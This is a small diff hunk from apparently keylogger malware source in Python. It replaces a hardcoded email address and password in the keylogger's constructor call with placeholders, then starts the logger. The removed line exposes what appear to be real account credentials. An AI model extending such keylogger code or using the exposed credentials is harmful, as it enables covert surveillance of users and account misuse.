@@ -111,5 +111,5 @@ class keylogger:
             self.advance()
             keyboard_listener.join()
 
-obj = keylogger("tt709218@gmail.com","qaz123!@")
+obj = keylogger(" Mail Address ","Password")
 obj.start()
